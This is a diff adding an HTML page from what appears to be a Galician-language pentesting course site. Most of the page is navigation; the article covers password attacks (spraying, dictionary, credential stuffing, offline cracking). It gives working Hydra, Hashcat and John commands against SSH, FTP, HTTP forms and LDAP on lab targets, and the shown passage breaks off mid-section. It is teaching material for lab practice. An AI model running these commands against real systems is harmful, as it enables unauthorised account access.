+      <a href="../../practicas-taller/windows/doc-vulnyx-admin/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Admin
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/doc-vulnyx-hosting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hosting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/doc-vulnyx-war/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    War
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/doc-vulnyx-store/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Store
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/resumo-ataque-indice_vulnyx_easy_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Resumo
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2_4" id="__nav_3_1_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Máquinas virtuais nivel Medium, so Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Máquinas virtuais nivel Medium, so Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/indice_vulnyx_medium_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/doc-vulnyx-controler/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Controler
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/doc-vulnyx-change/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Change
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/doc-vulnyx-misconfigured/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Misconfigured
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/resumo-ataque-indice_vulnyx_medium_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Resumo
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Vuln Lab AD-DC
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Vuln Lab AD-DC
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Laboratorio
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Laboratorio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/vuln-lab-ad/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    README
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/vuln-lab-ad/1-GUIA_MESTRA_VULN_HE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Guía mestra
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_1_3" id="__nav_3_2_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ataques específicos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Ataques específicos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/vuln-lab-ad/2-ATAQUE_ESPECIFICO_LLMNR_RESPONDER/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    LLMNR Responder
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/vuln-lab-ad/3-ATAQUE_ESPECIFICO_SEBACKUP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SeBackup
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/vuln-lab-ad/4-ATAQUE_ESPECIFICO_SEIMPERSONATE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SeImpersonate
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/vuln-lab-ad/5-ATAQUE_ESPECIFICO_ACLS_HELPDESK/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ACLs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/vuln-lab-ad/6-ANALISE_USUARIOS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Análise usuarios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../practicas-taller/windows/vuln-lab-ad/7-ENUMERACION-LDAP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Enumeración AD
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#indice" class="md-nav__link">
+    <span class="md-ellipsis">
+      Índice
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tipos-de-ataques-comuns" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tipos de ataques comúns
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tipos de ataques comúns">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-ataques-online-autenticacion-remota" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Ataques online (autenticación remota)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-ataques-offline-sobre-hashes" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Ataques offline (sobre hashes)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-ataques-por-formulacion-parsing-avanzado" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Ataques por formulación / parsing avanzado
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-password-spraying" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Password spraying
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-credential-stuffing" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Credential stuffing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-ataques-especificos-de-vectores" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Ataques específicos de vectores
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#taxonomia-e-vectores" class="md-nav__link">
+    <span class="md-ellipsis">
+      Taxonomía e vectores
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ferramentas-e-exemplos-por-tipoprotocolo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ferramentas e exemplos por tipo/protocolo
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Ferramentas e exemplos por tipo/protocolo">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ataques-online-multi-protocolo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ataques online — multi-protocolo
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#john-the-ripper-offline-diccionario-regras-incremental" class="md-nav__link">
+    <span class="md-ellipsis">
+      John the Ripper (offline — diccionario + regras / incremental)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hashcat-offline-gpucpu-dictionary-mask-hybrid" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hashcat (offline GPU/CPU — dictionary, mask, hybrid)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#wordlists-recomendadas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Wordlists recomendadas
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Wordlists recomendadas">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-rockyou" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. rockyou
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-kaonashi" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Kaonashi
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-seclists" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. SecLists
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-wordlists-de-kali-linux-usrsharewordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Wordlists de Kali Linux (/usr/share/wordlists)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xeracion-de-wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      Xeración de Wordlists
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Xeración de Wordlists">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-cewl-custom-word-list-generator" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. CeWL (Custom Word List generator)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. CeWL (Custom Word List generator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#caracteristicas-principais" class="md-nav__link">
+    <span class="md-ellipsis">
+      Características principais:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exemplos-de-uso" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exemplos de uso:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-crunch-pattern-based-wordlist-generator" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Crunch (Pattern-based wordlist generator)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Crunch (Pattern-based wordlist generator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#caracteristicas-principais_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Características principais:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sintaxe-basica" class="md-nav__link">
+    <span class="md-ellipsis">
+      Sintaxe básica:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exemplos-de-uso_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exemplos de uso:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-cupp-common-user-passwords-profiler" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. CUPP (Common User Passwords Profiler)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. CUPP (Common User Passwords Profiler)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#caracteristicas-principais_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Características principais:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exemplos-de-uso_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exemplos de uso:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#taboa-comparativa-de-ferramentas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Táboa comparativa de ferramentas
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#workflow-recomendado-para-xeracion-de-wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      Workflow recomendado para xeración de wordlists
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#creditos-e-bibliografia" class="md-nav__link">
+    <span class="md-ellipsis">
+      Créditos e bibliografía
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="ataques-a-contrasinais">Ataques a contrasinais</h1>
+<div class="admonition warning">
+<p class="admonition-title"><strong>De interese</strong></p>
+<p>Substitúe sempre <code>&lt;TARGET&gt;</code>, <code>&lt;USER&gt;</code>, <code>&lt;USERLIST&gt;</code>, <code>&lt;WORDLIST&gt;</code>, <code>&lt;COMBOFILE&gt;</code>, <code>&lt;HASHFILE&gt;</code> polos valores do teu laboratorio.</p>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Exemplos por tipo de ataque</p>
+<ol>
+<li>Password spraying (baixa taxa por usuario, poucos contrasinais, moitos usuarios)<br />
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Hydra (SSH)</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>hydra<span class="w"> </span>-L<span class="w"> </span>/labs/users.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Password123!&#39;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">1</span><span class="w"> </span>ssh://&lt;TARGET&gt;
+</span></code></pre></div></li>
+<li>Diccionario (usuario individual)
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Hydra (SSH)</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>&lt;USER&gt;<span class="w"> </span>-P<span class="w"> </span>/labs/wordlists/rockyou.txt<span class="w"> </span>ssh://&lt;TARGET&gt;
+</span></code></pre></div></li>
+<li>Forza bruta / Mask (formato coñecido) — offline
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Hashcat (mask)</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>hashcat<span class="w"> </span>-m<span class="w"> </span>&lt;HASH_TYPE&gt;<span class="w"> </span>-a<span class="w"> </span><span class="m">3</span><span class="w"> </span>/labs/hashes/&lt;HASHFILE&gt;<span class="w"> </span>?l?l?l?l?d?d
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># John (incremental)</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>john<span class="w"> </span>--incremental<span class="w"> </span>/labs/hashes/&lt;HASHFILE&gt;
+</span></code></pre></div></li>
+<li>Credential stuffing (pares filtrados)
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Hydra (FTP combos)</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>hydra<span class="w"> </span>-C<span class="w"> </span>/labs/combos/&lt;COMBOFILE&gt;<span class="w"> </span>ftp://&lt;TARGET&gt;
+</span></code></pre></div></li>
+<li>Form-based web brute (formularios non estándar)
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Hydra (http-post-form)</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>hydra<span class="w"> </span>-L<span class="w"> </span>/labs/users.txt<span class="w"> </span>-P<span class="w"> </span>/labs/wordlists/common.txt<span class="w"> </span>http-post-form://&lt;TARGET&gt;/login:<span class="s2">&quot;username=^USER^&amp;password=^PASS^:Login failed&quot;</span>
+</span></code></pre></div></li>
+<li>LDAP / Active Directory (bind attempts)
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Hydra (LDAP)</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>hydra<span class="w"> </span>-L<span class="w"> </span>/labs/users.txt<span class="w"> </span>-P<span class="w"> </span>/labs/wordlists/ad_common.txt<span class="w"> </span>ldap://&lt;TARGET&gt;
+</span></code></pre></div></li>
+</ol>
+</div>
+<hr />
+<p><a id="indice"></a></p>
+<h2 id="indice">Índice</h2>
+<ol>
+<li><a href="#tipos-de-ataques-comúns-introdución">Tipos de ataques comúns</a>    </li>
+<li><a href="#taxonomía-e-vectores">Taxonomía e vectores</a>    </li>
+<li><a href="#ferramentas-e-exemplos-por-tipoprotocolo">Ferramentas e exemplos por tipo/protocolo</a>   <ul>
+<li>Hydra, Medusa, Patator (ataques online)   </li>
+<li>John, Hashcat (ataques offline)    </li>
+</ul>
+</li>
+<li><a href="#wordlists-recomendadas">Wordlists recomendadas</a></li>
+<li><a href="#xeracion-wordlists">xeración de wordlists</a></li>
+<li><a href="#créditos-e-bibliografía-curta">Créditos e bibliografía</a>    </li>
+</ol>
+<hr />
+<p><a id="tipos-de-ataques-comúns-introdución"></a></p>
+<h2 id="tipos-de-ataques-comuns">Tipos de ataques comúns</h2>
+<p>Nesta sección introdúcese a taxonomía dos ataques a contrasinais que se usarán ao longo das prácticas. Para cada tipo indícanse as características principais e os vectores máis comúns.</p>
+<p><a id="1-ataques-online-autenticación-remota"></a></p>
+<h3 id="1-ataques-online-autenticacion-remota">1. Ataques online (autenticación remota)</h3>
+<p>Ataques que interactúan directamente co servizo de autenticación (SSH, RDP, FTP, IMAP, SMTP, HTTP forms, LDAP, etc.). Exemplos: forza bruta, diccionario, password spraying, credential stuffing. </p>
+<p>Detectables mediante mecanismos de limitación de intentos (limitación de frecuencia de login) e logs de autenticación do sistema.</p>
+<p><a id="2-ataques-offline-sobre-hashes"></a></p>
+<h3 id="2-ataques-offline-sobre-hashes">2. Ataques offline (sobre hashes)</h3>
+<p>Ataques que operan sobre ficheiros de hashes (obtidos legalmente no laboratorio): dictionary + rules, mask attacks, GPU‑accelerated cracking, rainbow tables. </p>
+<p>Non implican interacción co servizo en produción.</p>
+<p><a id="3-ataques-por-formulación-parsing-avanzado"></a></p>
+<h3 id="3-ataques-por-formulacion-parsing-avanzado">3. Ataques por formulación / parsing avanzado</h3>
+<p>Ataques sobre formularios web non estándar que requiren parseo de respostas (HTML/JSON) e xestión de tokens (CSRF). </p>
+<p>Usan ferramentas con capacidades flexibles de extracción de patróns de fallo.</p>
+<p><a id="4-password-spraying"></a></p>
+<h3 id="4-password-spraying">4. Password spraying</h3>
+<p>Probar poucos contrasinais comúns contra moitos usuarios para evitar bloqueo por conta. Baixa taxa por usuario; útil en entornos con bloqueo agresivo.</p>
+<div class="admonition tip">
+<p class="admonition-title">Password spraying vs forza bruta</p>
+<p>O <strong>password spraying</strong> consiste en probar <strong>poucos contrasinais</strong> contra <strong>moitos usuarios</strong> para evitar bloqueos por intentos fallidos.
+Se se proban <strong>moitos contrasinais</strong> contra <strong>un só usuario</strong> (ou moi poucos), iso xa <strong>non é password spraying</strong>, senón <strong>forza bruta dirixida por usuario</strong>.</p>
+</div>
+<p><a id="5-credential-stuffing"></a></p>
+<h3 id="5-credential-stuffing">5. Credential stuffing</h3>
+<p>Empregar listas de parellas <em>user:pass</em> obtidas doutras <strong>exposicións de credenciais</strong> para probar acceso en novos servizos. A chave é a reutilización das contrasinais polos usuarios.</p>
+<p><a id="6-ataques-específicos-de-vectores"></a></p>
+<h3 id="6-ataques-especificos-de-vectores">6. Ataques específicos de vectores</h3>
+<ul>
+<li><strong>Wi-Fi PSK cracking</strong>: captura de handshake + cracking offline.  </li>
+<li><strong>APIs/Token guessing</strong>: comprobación de endpoints REST (JWTs, Bearer tokens).  </li>
+<li><strong>IoT / telnet / HTTP embebido</strong>: comprobación de credenciais por defecto.</li>
+</ul>
+<hr />
+<p><a id="taxonomía-e-vectores"></a></p>
+<h2 id="taxonomia-e-vectores">Taxonomía e vectores</h2>
+<table>
+<thead>
+<tr>
+<th>Tipo de ataque</th>
+<th style="text-align: right;">Vector(s) comúns</th>
+<th>Ferramentas exemplificativas</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Password spraying</td>
+<td style="text-align: right;">SSH, RDP, HTTP form, LDAP</td>
+<td>hydra</td>
+</tr>
+<tr>
+<td>Diccionario (online)</td>
+<td style="text-align: right;">SSH, FTP, SMTP, HTTP form</td>
+<td>hydra</td>
+</tr>
+<tr>
+<td>Forza bruta (mask)</td>
+<td style="text-align: right;">Hashes offline, servizos en liña limitados</td>
+<td>hashcat, john, hydra</td>
+</tr>
+<tr>
+<td>Credential stuffing</td>
+<td style="text-align: right;">HTTP, FTP, SSH, APIs</td>
+<td>hydra, scripts</td>
+</tr>
+<tr>
+<td>Offline cracking</td>
+<td style="text-align: right;">Ficheiros de hashes</td>
+<td>john, hashcat, <a href="https://crackstation.net/" target="_blank">CrackStation</a></td>
+</tr>
+<tr>
+<td>Form-based brute</td>
+<td style="text-align: right;">HTTP POST/JSON endpoints</td>
+<td>hydra</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title">CrackStation</p>
+<p>Aínda que <a href="https://crackstation.net/" target="_blank">CrackStation</a> funciona a través dunha páxina web, <strong>segue sendo un método de ataque offline</strong> no contexto do pentesting.
+Isto débese a que o hash se procesa fóra do sistema obxectivo e <strong>non se realizan intentos de autenticación contra o servizo real</strong>, evitando bloqueos de contas e rexistros sospeitosos.</p>
+</div>
+<hr />
+<p><a id="ferramentas-e-exemplos-por-tipoprotocolo"></a></p>
+<h2 id="ferramentas-e-exemplos-por-tipoprotocolo">Ferramentas e exemplos por tipo/protocolo</h2>
+<blockquote>
+<p><strong>Convencións</strong>:</p>
+<ul>
+<li><code>&lt;TARGET&gt;</code>: IP/hostname da VM de laboratorio (ex.: <code>192.168.56.120</code>)</li>
+<li><code>&lt;USER&gt;</code>: usuario individual (ex.: <code>xurxo</code>)</li>
+<li><code>&lt;USERLIST&gt;</code>: ficheiro con usuarios (un por liña)</li>
+<li><code>&lt;WORDLIST&gt;</code>: ficheiro de contrasinais (ex.: <code>rockyou.txt</code>)</li>
+<li><code>&lt;COMBOFILE&gt;</code>: ficheiro <code>user:pass</code> (credential stuffing)</li>
+<li><code>&lt;HASHFILE&gt;</code>: ficheiro con hashes para cracking offline</li>
+</ul>
+</blockquote>
+<hr />
+<p><a id="hydra-ataques-online-multiprotocolo"></a></p>
+<h3 id="ataques-online-multi-protocolo">Ataques online — multi-protocolo</h3>
+<p><strong>SSH (diccionario contra un usuario ou varios usuarios)</strong>:</p>
+<ul>
+<li><em>Hydra</em>:</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>hydra<span class="w"> </span>-l<span class="w"> </span>&lt;USER&gt;<span class="w"> </span>-P<span class="w"> </span>/labs/wordlists/&lt;WORDLIST&gt;<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-s<span class="w"> </span><span class="m">22</span><span class="w"> </span>ssh://&lt;TARGET&gt;
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>hydra<span class="w"> </span>-L<span class="w"> </span>&lt;USERLIST&gt;<span class="w"> </span>-P<span class="w"> </span>/labs/wordlists/&lt;WORDLIST&gt;<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-s<span class="w"> </span><span class="m">22</span><span class="w"> </span>ssh://&lt;TARGET&gt;
+</span></code></pre></div>
+<p><strong>FTP (credential stuffing con combo file <code>user:pass</code>)</strong>:</p>
+<ul>
+<li><em>Hydra</em>:</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>hydra<span class="w"> </span>-C<span class="w"> </span>/labs/combos/&lt;COMBOFILE&gt;<span class="w"> </span>ftp://&lt;TARGET&gt;
+</span></code></pre></div>
+<p><strong>HTTP form (login via POST; especificar string de erro)</strong>:</p>
+<ul>
+<li><em>Hydra</em>:</li>
+</ul>
